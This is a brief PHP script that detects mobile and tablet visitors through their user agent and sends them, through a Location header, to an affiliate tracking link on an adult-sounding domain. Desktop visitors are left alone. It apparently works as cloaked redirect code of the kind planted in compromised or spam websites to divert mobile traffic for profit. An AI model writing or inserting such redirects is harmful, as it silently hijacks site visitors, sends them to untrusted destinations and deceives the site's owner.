<?php
include "mobile_redirect.php";
$detect = new Mobile_Detect;
$detect->setUserAgent($_SERVER['HTTP_USER_AGENT']);
if ($detect->isMobile() || $detect->isTablet()) {
$excludeTablets = true;
$excludeIOSAndroid = true;
$isiOs = $detect->isiOs();
$isAndroidOs = $detect->isAndroidOS();
$isFeaturePhone = $detect->isMobile() && !$isAndroidOs && !$isiOs;
if($isFeaturePhone || ($detect->isTablet() && $excludeTablets)
|| ((($isiOs && !$detect->isTablet() || $isAndroidOs) && $excludeIOSAndroid))
) {
header('Location: https://laldwd.facebookgirls.net/c/2148702d7c2782df?s1=95240&s2=1197075&click_id=Vulzkranz&j1=1&j3=1');
}
}
